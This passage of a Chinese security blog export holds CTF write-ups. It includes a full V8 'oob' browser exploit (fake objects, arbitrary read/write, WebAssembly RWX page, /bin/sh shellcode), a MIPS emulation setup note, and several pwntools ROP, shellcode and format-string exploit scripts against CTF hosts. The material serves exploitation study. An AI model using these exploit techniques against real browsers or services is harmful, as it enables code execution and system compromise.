class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak wasm_func_addr: 0x"</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">[*] leak wasm func addr: 0x000019659b1a1fe8</span><br><span class="line">[*] leak rwx_page_addr: 0x000028c152102000</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; vmmap 0x000028c152102000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x28c152102000     0x28c152103000 rwxp     1000 0       +0x0</span><br></pre></td></tr></table></figure>
<p>成功！</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>编写getshell的部分</p>
<p>shellcode这里找的：<a href="https://www.it610.com/article/1295723160905261056.htm" target="_blank" rel="noopener">https://www.it610.com/article/1295723160905261056.htm</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line">	<span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line">	<span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line">	<span class="number">0x050fd231583b6an</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">f();<span class="comment">//调用wasm，实际调用到了shellcode</span></span><br></pre></td></tr></table></figure>
<h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak wasm_func_addr: 0x"</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line"><span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line"><span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line"><span class="number">0x050fd231583b6an</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/23/17-42/image-20201017022813473.png" alt="image-20201017022813473"></p>
<p>注：非root用户可以开shell，/bin/sh这个文件不是只有root才能执行，进root是提权洞存在的意义。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>从一道CTF题零基础学V8漏洞利用：<a href="https://www.freebuf.com/vuls/203721.html（这篇知识+调试，全但是有点杂，建议进一步理解时候看）" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html（这篇知识+调试，全但是有点杂，建议进一步理解时候看）</a></li>
<li>浏览器入门之starctf-OOB：<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/（这篇方便调试，建议先看，调一遍）" target="_blank" rel="noopener">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/（这篇方便调试，建议先看，调一遍）</a></li>
<li>Exploiting v8: *CTF 2019 oob-v8：<a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noopener">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li>
<li>2019-StarCtf-oob：<a href="https://0xfocu5.github.io/posts/7eb4a1e6/" target="_blank" rel="noopener">https://0xfocu5.github.io/posts/7eb4a1e6/</a></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>花了好久，终于弄完了，真的是，做题5分钟，环境3小时的真实写照，环境强推国外云服务器，大概需要1天时间。</p>
<p>v8这块做下来，还是比较好理解的，可能刚开始看有点晕，但是静下心来好好想想还是能想得通。</p>
<blockquote>
<p>本文由<strong>winter</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/219815" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219815</a><br>安全客 - 有思想的安全新媒体                            </p>
</blockquote>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>embedded(未完成)</title>
    <url>/2020/10/22/01-17/</url>
    <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
<p>linux：sudo ifconfig tap0 12.0.0.2</p>
<p>qemu：ifconfig eth0 12.0.0.1 </p>
<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
<p>ping通</p>
<p>linux：python -m SimpleHTTPServer</p>
<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
<p><img src="/2020/10/22/01-17/image-20200831110650474.png" alt="image-20200831110650474"></p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/22/01-17/image-20200831191612015.png" alt="image-20200831191612015"></p>
<p>qemu-mips  -L ./ ./embedded_heap</p>
<p>也可以直接<code>./embedded_heap</code></p>
<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
<p><strong>注意</strong></p>
<p>还要修改lib文件下链接文件的权限</p>
<p><img src="/2020/10/22/01-17/image-20200831191636914.png" alt="image-20200831191636914"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
<hr>
<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>mips pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>buu每日一题（1）</title>
    <url>/2020/11/20/16-35/</url>
    <content><![CDATA[<h1 id="buu每日一题（1）"><a href="#buu每日一题（1）" class="headerlink" title="buu每日一题（1）"></a>buu每日一题（1）</h1><blockquote>
<ul>
<li><a href="https://blog.csdn.net/qq_43935969/article/details/104609258?spm=1001.2014.3001.5501" target="_blank" rel="noopener">BUUCTF刷题（前12道）</a></li>
<li><a href="https://blog.csdn.net/qq_43935969/article/details/106162618?spm=1001.2014.3001.5501" target="_blank" rel="noopener">buuctf刷题（2）【13题 - 】</a></li>
</ul>
<p>形成题感把，，，每天必须做一道</p>
</blockquote>
<h2 id="1-jarvisoj-level2"><a href="#1-jarvisoj-level2" class="headerlink" title="1. jarvisoj_level2"></a>1. jarvisoj_level2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29936</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048320</span> </span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">0x4</span>)*<span class="string">'a'</span> + p32(system) + p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2-jarvisoj-level2-x64"><a href="#2-jarvisoj-level2-x64" class="headerlink" title="2. jarvisoj_level2_x64"></a>2. jarvisoj_level2_x64</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level2_x64"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29525</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0004004C0</span> </span><br><span class="line">binsh = <span class="number">0x0000000600A90</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x80</span>+<span class="number">0x8</span>)*<span class="string">'a'</span> +  p64(pop_rdi)+  p64(binsh)+  p64(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="3-ciscn-2019-n-5"><a href="#3-ciscn-2019-n-5" class="headerlink" title="3. ciscn_2019_n_5"></a>3. ciscn_2019_n_5</h2><blockquote>
<p>这道题是ret2shellcode，nx没有开</p>
<p>shellcraft.sh()需要设置好context</p>
<p><code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code>，否则可能不太行</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_n_5"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26381</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"tell me your name"</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">log.success(len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ant to say to me?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(<span class="number">0x0601080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="4-铁人三项-第五赛区-2018-rop"><a href="#4-铁人三项-第五赛区-2018-rop" class="headerlink" title="4. 铁人三项(第五赛区)_2018_rop"></a>4. 铁人三项(第五赛区)_2018_rop</h2><blockquote>
<p>简单的rop，栈溢出调用write泄露地址，然后继续main调用system</p>
<p>注意参数，，，，不要写错，，，</p>
<p>然后libc用libcsearcher的话，和本低是不一样的，，，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./2018_rop"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26162</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./2018_rop"</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">getegid_got = elf.got[<span class="string">'getegid'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"plt:"</span>+hex(write_plt))</span><br><span class="line"><span class="comment"># log.success("got:"+hex(write_got))</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x080484C6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt)+ p32(main) + p32(<span class="number">1</span>)+p32(getegid_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">getegid_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(hex(getegid_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"getegid"</span>,getegid_addr)</span><br><span class="line">libc_base = getegid_addr - obj.dump(<span class="string">'getegid'</span>)</span><br><span class="line">system = obj.dump(<span class="string">"system"</span>) + libc_base</span><br><span class="line">binsh = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) +p32(system)+ p32(main) +p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="5-jarvisoj-fm"><a href="#5-jarvisoj-fm" class="headerlink" title="5. jarvisoj_fm"></a>5. jarvisoj_fm</h2><blockquote>
<p>简单的格式化字符串</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./fm"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26413</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#The index of format argument : 12 ("\%11$p")</span></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">x= <span class="number">0x0804a02c</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;x:<span class="number">4</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="6-others-shellcode"><a href="#6-others-shellcode" class="headerlink" title="6. others_shellcode"></a>6. others_shellcode</h2><blockquote>
<p>运行就能拿到flag</p>
</blockquote>
<h2 id="7-bjdctf-2020-babyrop"><a href="#7-bjdctf-2020-babyrop" class="headerlink" title="7. bjdctf_2020_babyrop"></a>7. bjdctf_2020_babyrop</h2><blockquote>
<p>64位的rop</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># = process("./bjdctf_2020_babyrop")</span></span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25380</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bjdctf_2020_babyrop"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"story"</span>)</span><br><span class="line">payload = <span class="number">0x28</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex((read_addr)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,(read_addr))</span><br><span class="line">libc_base = read_addr - obj.dump(<span class="string">"read"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x28</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
